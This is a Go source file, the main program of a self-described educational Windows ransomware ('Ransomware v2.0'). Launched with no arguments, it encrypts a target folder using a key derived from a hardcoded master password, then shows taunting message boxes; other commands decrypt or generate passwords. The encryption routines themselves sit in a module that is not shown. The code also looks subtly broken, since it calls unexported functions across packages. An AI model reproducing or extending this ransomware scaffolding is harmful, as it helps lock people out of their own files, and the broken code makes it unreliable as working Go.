package main

import (
    "crypto/sha256"
    "fmt"
    "os"
    "unsafe"

    "golang.org/x/sys/windows"
    "main/modules"
)

const (
    VERSION       = "2.0"
    TARGET_DIR    = "./archivos_privados"  // Carpeta objetivo
    MAPPING_FILE  = ".secret_mapping.enc"  // Archivo con el mapeo
    HIDDEN_FOLDER = ".hidden_data"         // Carpeta donde ocultar
)

// Variables globales, para la contraseña 

var (
    masterPassword   = "MadameYuDoberman"  // Master password
    recoveryPassword = ""                   // Se genera dinámicamente
)

// FileMapping guarda la relación entre archivo original y oculto, los mapping son una especie de matrices en dónde se genera un "mapa" y guarda cosas en cada casilla
type FileMapping struct {
	// En originalPath se guardan los paths de los files originales para después re-ingresarlos
    OriginalPath string `json:"original"` //Se usan json porque es para guardar datos en un formato entendible y legible
	// El hiidingPath es lo mismo, se crea una carpeta en dónde se guardan todos los files y se guarda el path en este map
    HiddenPath   string `json:"hidden"`
}

// Lista de personajes 
var castlevaniaCharacters = []string{
	"Carmilla", "Lenore", "Morana", "Tera", "Maria", "Annette", "Drolta", "Striga",
}

func main() {
    banner() // Mostramos el banner

	// Si no hay argumentos, encriptar automáticamente
	if len(os.Args) < 2 {
		// Generar password de recuperación
		recoveryPassword = modules.generatePasswd()
		fmt.Println("\n[!] Your recovery password is:")
		fmt.Printf("    %s\n\n", recoveryPassword)
		
		showWarning()
		
		// Encriptar con la master password
		key := sha256.Sum256([]byte(masterPassword))
		modules.lockFiles(key[:])
		
		showFuckOff()
		help()
		os.Exit(0)
	}

	// Los argumentos que se le pasarán a la herramienta
	comando := os.Args[1]

	switch comando { // Lista de comandos
	case "a":
		about()
	case "u":
		key := modules.getPsswd()  // Ahora retorna el hash directamente
		modules.unlock(key)
	case "g":
		fmt.Println(modules.generatePasswd())
	case "h":
		help()
	default: 
		fmt.Println("[!] Not valid command:", comando)
		help()
		os.Exit(1)
	}
}

//Lo que se va a imprimir en consola
func banner() {
    fmt.Println("╔════════════════════════════╗")
    fmt.Printf("║  Ransomware v%s           ║\n", VERSION) // Printf nos imprime con formato, algo parecido al -e en bash
    fmt.Println("║  Educational Tool          ║")
    fmt.Println("╚════════════════════════════╝")
	fmt.Println("                by: AreiaNight")
}

func help() {
    fmt.Println("\nCommand lines:")
    fmt.Println("- u  > for decrypt the files")
    fmt.Println("- a  > about this project and some background")
	fmt.Println("- g  > genera una contraseña temporal")
	fmt.Println("- h  > show this help\n")
}

func about() {
    fmt.Println("\nThis is an educational project. I created this because as a kid I wanted a bait for possible thiefs or curious persons who wanted to mess with my pc\n and make my computer unreachable. So this is a kind of ransomware based on that idea \nbecause this isn't for malicious propouses but a way for me to learn go and make that idea I had as a little girl true\n") 
}

func showWarning() {
	user32 := windows.NewLazySystemDLL("user32.dll")
	messageBox := user32.NewProc("MessageBoxW")

	text, _ := windows.UTF16PtrFromString("BE CAREFUL, SUCKER!")
	title, _ := windows.UTF16PtrFromString("Warning")

	messageBox.Call(
		0,
		uintptr(unsafe.Pointer(text)),
		uintptr(unsafe.Pointer(title)),
		0x30,
	)
}

func showFuckOff() {
	user32 := windows.NewLazySystemDLL("user32.dll")
	messageBox := user32.NewProc("MessageBoxW")

	text, _ := windows.UTF16PtrFromString("All gone, fuck you!")
	title, _ := windows.UTF16PtrFromString("Warning")

	messageBox.Call(
		0,
		uintptr(unsafe.Pointer(text)),
		uintptr(unsafe.Pointer(title)),
		0x30,
	)
}

